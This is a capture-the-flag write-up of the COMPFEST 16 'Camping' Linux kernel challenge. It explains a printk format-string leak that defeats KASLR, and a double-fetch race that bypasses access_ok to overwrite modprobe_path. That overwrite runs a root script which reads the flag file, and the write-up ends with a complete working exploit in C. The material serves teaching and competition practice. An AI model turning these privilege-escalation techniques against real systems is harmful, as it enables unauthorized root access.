# COMPFEST 16 Finals

{% hint style="info" %}
Team: <mark style="color:blue;">**seisyun complex**</mark>&#x20;

Rank: <mark style="color:yellow;">3rd</mark> / <mark style="color:yellow;">15</mark>
{% endhint %}

<table><thead><tr><th width="297">Challenge</th><th width="349">Category</th><th data-hidden align="center">Points</th></tr></thead><tbody><tr><td>Camping</td><td>Binary Exploitation</td><td align="center">100 pts</td></tr></tbody></table>

## Camping

### Analysis

&#x20;as per the usual kernel challenge, we're given the following files

```bash
└──╼ [★]$ tree .
.
├── bzImage
├── camping.c
├── initramfs.cpio.gz
└── launch.sh
```

let's examine at the environment by taking a look at `launch.sh`

```bash
#!/bin/bash

/usr/bin/qemu-system-x86_64 \
    -kernel $PWD/bzImage \
    -m 256M \
    -initrd $PWD/initramfs.cpio.gz \
    -nographic \
    -monitor none \
    -no-reboot \
    -cpu kvm64,+smep \
    -append "console=ttyS0 kaslr nosmap kpti=1 quiet panic=1 oops=panic" \
    -smp 2
```

we can see that KASLR, SMEP and KPTI is enabled but not SMAP.

now let's take a look at the challenge, thankfully the author has provided us with the kernel module source code. we can interact with the module through the IOCTL interface

```c
static long camping_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
        case KINTRO:
            return camping_intro(arg);
        case KGREET:
            return camping_greet(arg);
        case KVISIT:
            return camping_visit(arg);
        default:
            printk(KERN_ALERT "camping: Invalid command\n");
            return -EINVAL;
    }
}
```

* KINTRO

this command assigns the global `visitor` fields.

```c
struct visitor_data {
    char name[BUFFER_SIZE];
    uint64_t location;
    char decoration[BUFFER_SIZE];
} visitor;

static long camping_intro(unsigned long arg) {
    if (copy_from_user(&visitor, (struct visitor_data __user *)arg, sizeof(visitor))) {
        printk(KERN_ALERT "camping: intro failed\n");
        return -EFAULT;
    }
    printk(KERN_INFO "camping: Welcome! Let's go camping and relax~\n");
    return 0;
}
```

* KGREET

this one uses the plain `printk()` without any log level (i.e. `KERN_INFO`, `KERN_DEBUG` etc), which prints to the program's stdout that provoke it instead of kernel log through `dmesg`.

```c
static long camping_greet(unsigned long arg) {
    char hello[] = KERN_ALERT "camping: Hello, ";
    char greeting[BUFFER_SIZE + sizeof(hello) + 1];

    memcpy(greeting, hello, sizeof(hello));
    memcpy(greeting + sizeof(hello) - 1, visitor.name, BUFFER_SIZE);

    printk(greeting);
    printk(KERN_INFO "camping: I see you're ready for an adventure, let's visit a nice campsite! :)\n");
    return 0;
}
```

* KVISIT

visit copies the `decoration` field to the address at `location`.

```c
static long camping_visit(unsigned long arg) {
    printk(KERN_INFO "camping: So you want to visit that campsite huh, okay here we go!\n");

    if (!access_ok((void __user *)visitor.location, BUFFER_SIZE)) {
        printk(KERN_ALERT "camping: Sorry, that campsite is not open yet! ~_~\n");
        return -EFAULT;
    }

    printk(KERN_INFO "camping: It looks a bit plain... let's add some decorations!\n");

    int len = strnlen(visitor.decoration, BUFFER_SIZE);
    for (int i = 0; i < len; i++) {
        if (!isalnum(visitor.decoration[i])) {
            printk(KERN_ALERT "camping: That decoration is... a bit questionable?\n");
            return -EINVAL;
        }
    }

    printk(KERN_INFO "camping: Decorating...\n");
    memcpy((void __user *)visitor.location, visitor.decoration, len + 1);

    printk(KERN_INFO "camping: Done! Your campsite is now beautifully decorated :)\n");
    printk(KERN_INFO "camping: Enjoy your camping experience!\n");
    return 0;
}
```

there are two function that I'm not familiar with here, first is `access_ok()`

{% embed url="https://www.cs.bham.ac.uk/~exr/lectures/opsys/13_14/docs/kernelAPI/r3676.html" %}

> access\_ok -- Checks if a user space pointer is valid

which means the `location` field has to be an address within the user space.

second is `isalnum()` but I decided to take it for granted for its self explanatory name.

### Exploitation

the first thing I take attention of is KASLR, one thing I took notice is `printk(greeting);` in KGREET which seems to be a format string vulnerability. so I took it to the test

```c
int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);

    fd = open("/dev/camping", O_RDWR);
    if (fd < 0){
        perror("[-] open");
        return 1;
    }
    printf("[+] Device opened successfully, fd: %d\n", fd);

    for(int i = 0x0; i < BUFFER_SIZE/4; i++) {
        strcat(payload.name, "%lx|");
    }

    if (ioctl(fd, KINTRO, &payload) != 0){
        perror("[-] ioctl KINTRO");
        return 1;
    }

    if (ioctl(fd, KGREET, NULL) != 0) {
        perror("[-] ioctl KGREET");
        return 1;
    }

    return 0;
}
```

However, even though I kinda already grasp the overall challenge and how to exploit it, this is ultimately where I got stuck because the address leak that we got from is somehow cropped

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

and so I thought I could use the `f'%{offset}$p'` format but as I test it, it doesnt seem to work. reading the printk's format documentation it does seems that the `$` is not applicable

{% embed url="https://www.kernel.org/doc/Documentation/printk-formats.txt" %}

{% hint style="warning" %}
days after, I realized that is it actually being printed and can be shown if I resize the terminal. it seems that the kernel prints without taking the terminal's dimension into account and not wrap it around as shown in the picture below &#x20;
{% endhint %}

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

after the the competition had ended the challenge author told us that he uses newline (of course, why didn't I think of that) for the work around on this problem and it definitely worked

```c
int main(int argc, char *argv[]){
    // ... snippet

    for(int i = 0x0; i < BUFFER_SIZE/4; i++) {
        strcat(payload.name, "%lx\n");
    }

    // ... snippet
} 
```

<figure><img src="../../.gitbook/assets/image (28).png" alt="" width="212"><figcaption></figcaption></figure>

I took the address with the higher address i.e. `ffffffff00000000` and try to find it's offset from the kernel base.&#x20;

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

to make sure it's reliable and not affected by FG-KASLR, I tried running it multiple times and making sure the offset is not changed.

next, using stdin we'll take the address and calculate the kernel base

```c
int main(int argc, char *argv[]){
    // ... snippet

    printf("[!] enter kernel addr: ");
    scanf("%lx", &kbase);
    kbase = kbase - 0x2ab902;
    
    return 0;
}
```

next to get the flag, we'll going to use modprobe technique, I won't explain it in depth since there are other people who had done the job better than I could've had linked below:

{% embed url="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/" %}

{% embed url="https://tripoloski1337.github.io/ctf/kernelexploit/2023/01/06/modprobe-overwrite.html" %}

first let's get the `modprobe_path` address and its offset (also as previously, double check to make sure its not affected by FG-KASLR)

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

to exploit it, we would need to have arbitrary write primitive, we could've easily had this through KVISIT:&#x20;

```c
static long camping_visit(unsigned long arg) {
    // ... snippet
    memcpy((void __user *)visitor.location, visitor.decoration, len + 1);

    // ... snippet
}
```

however `access_ok()` will be denying our request since the address would be one in the kernel space instead of user space.&#x20;

this could be bypassed through the vulnerability called `double fetch` explained here:

{% embed url="https://n132.github.io/2022/05/19/Introduction-of-Kernel-Pwn-Double-Fetch.html" %}

this is also similar to a challenge I have previously solved which is HTB's Kernel Adventures: Part 1

to do this, we'll need two asynchronous execution, one thread will continuously request for KVISIT, trying to trigger the `memcpy` :

```c
void *visit() {
    while (!success) {
        ioctl(fd, KVISIT, NULL);
        exec_modprobe();   
    }
}
```

while the other thread will continuously swap the values of `location` to satisfy `access_ok()` and `decoration` to satisfy `isalnum()` in the hopes that the race will satisfy both of the checks while contains our payload to overwrite modprobe by the time `memcpy` is called.

```c
void *switcher() {
    while (!success) {
        payload.location = (unsigned long) &dummy_decoration;
        payload.decoration[0] = 'A';
        payload.decoration[4] = 'A';
        ioctl(fd, KINTRO, &payload);
        
        payload.location = modprobe_path;
        payload.decoration[0] = '/';
        payload.decoration[4] = '/';
        ioctl(fd, KINTRO, &payload);
        
        exec_modprobe();
    }
}
```

before all this, we might want to set up the modprobe files to make it more efficient

```c
void prep_modprobe() {
    puts("[*] Setting up for fake modprobe");

    system("echo '#!/bin/sh\ncp /root/flag.txt /tmp/flag\nchmod 777 /tmp/flag' > /tmp/pwn");
    system("chmod +x /tmp/pwn");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
}

int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);
    prep_modprobe();

    fd = open("/dev/camping", O_RDWR);
    // ... snippet
}
```

while the `exec_modprobe()` will just try to execute modprobe and check if the is now exists

```c
void exec_modprobe() {
    puts("[*] Run unknown file");
    system("/tmp/dummy");

    if (open("/tmp/flag", O_RDONLY) > 0) {
        puts("[+] Success!");
        success = 0x1;
    } else {
        puts("[-] Failed!");
        return;
    }

    puts("[+] readflag");
    system("cat /tmp/flag");

    exit(0);
}
```

lastly, fired up the threads and hope you'll win the race

```c
int main(int argc, char *argv[]){
    // ... snippet

    pthread_t t_visit;
    pthread_t t_switch;

    pthread_create(&t_visit, NULL, visit, NULL); 
    pthread_create(&t_switch, NULL, switcher, NULL);

    pthread_join(t_visit, NULL);
    pthread_join(t_switch, NULL);

    return 0;
}
```

<figure><img src="../../.gitbook/assets/image (31).png" alt="" width="563"><figcaption></figcaption></figure>

below is the full exploit:

{% code title="exploit.c" %}
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>

#define KINTRO 0xCABE0000
#define KGREET 0xCABE0001
#define KVISIT 0xCABE0002
#define BUFFER_SIZE 0x100

typedef struct visitor {
    char name[BUFFER_SIZE];
    unsigned long location;
    char decoration[BUFFER_SIZE];
} visitor;

visitor payload = {
    .name = "",
    .location = 0x0,
    .decoration = "/tmp/pwn"
};

int fd, success = 0x0;
unsigned long kbase, modprobe_path = 0x0;

char dummy_decoration[BUFFER_SIZE]= { 0x0 };

void prep_modprobe() {
    puts("[*] Setting up for fake modprobe");

    system("echo '#!/bin/sh\ncp /root/flag.txt /tmp/flag\nchmod 777 /tmp/flag' > /tmp/pwn");
    system("chmod +x /tmp/pwn");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
}

void exec_modprobe() {
    puts("[*] Run unknown file");
    system("/tmp/dummy");

    if (open("/tmp/flag", O_RDONLY) > 0) {
        puts("[+] Success!");
        success = 0x1;
    } else {
        puts("[-] Failed!");
        return;
    }

    puts("[+] readflag");
    system("cat /tmp/flag");

    exit(0);
}

void *switcher() {
    while (!success) {
        payload.location = (unsigned long) &dummy_decoration;
        payload.decoration[0] = 'A';
        payload.decoration[4] = 'A';
        ioctl(fd, KINTRO, &payload);
        
        payload.location = modprobe_path;
        payload.decoration[0] = '/';
        payload.decoration[4] = '/';
        ioctl(fd, KINTRO, &payload);
        
        exec_modprobe();
    }
}

void *visit() {
    while (!success) {
        ioctl(fd, KVISIT, NULL);
        exec_modprobe();   
    }
}

int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);
    prep_modprobe();

    fd = open("/dev/camping", O_RDWR);
    if (fd < 0){
        perror("[-] open");
        return 1;
    }
    printf("[+] Device opened successfully, fd: %d\n", fd);

    for(int i = 0x0; i < BUFFER_SIZE/4; i++) {
        strcat(payload.name, "%lx\n");
    }

    if (ioctl(fd, KINTRO, &payload) != 0){
        perror("[-] ioctl KINTRO");
        return 1;
    }

    if (ioctl(fd, KGREET, NULL) != 0) {
        perror("[-] ioctl KGREET");
        return 1;
    }

    printf("[!] enter kernel addr: ");
    scanf("%lx", &kbase);
    kbase = kbase - 0x2ab902;
    modprobe_path = kbase + 0x1b3f3c0;

    printf("[+] Kernel Base: %#lx\n", kbase);
    printf("[+] Modprobe Path: %#lx\n", modprobe_path);

    pthread_t t_visit;
    pthread_t t_switch;

    pthread_create(&t_visit, NULL, visit, NULL); 
    pthread_create(&t_switch, NULL, switcher, NULL);

    pthread_join(t_visit, NULL);
    pthread_join(t_switch, NULL);

    return 0;
}
```
{% endcode %}
